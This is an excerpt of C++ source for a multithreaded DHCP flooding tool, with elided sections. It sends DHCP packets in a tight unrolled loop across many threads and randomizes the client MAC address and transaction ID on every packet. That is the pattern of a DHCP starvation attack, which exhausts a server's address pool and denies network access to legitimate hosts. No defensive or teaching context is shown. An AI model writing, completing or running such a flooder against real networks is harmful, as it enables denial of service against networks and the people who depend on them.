...
constexpr size_t PACKET_POOL_SIZE = 512;
...
void send_packets(int thread_id) {
    ...
    // Unroll the loop: send multiple packets per iteration
    while (!should_exit.load(std::memory_order_relaxed)) {
        for (int i = 0; i < 8; ++i) {
            DHCP& packet = packet_pool[packet_index];

            // Randomize MAC and XID EVERY PACKET for maximum uniqueness
            generate_random_mac(packet.chaddr);
            packet.xid = rand();

            if (sendto(sock, &packet, sizeof(DHCP), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                // Don't print every error, just count failed packets if desired
            } else {
                local_counter++;
            }
...
int main() {
    ...
    // Increase thread count even more
    unsigned int num_threads = std::max(8u, std::thread::hardware_concurrency() * 4);
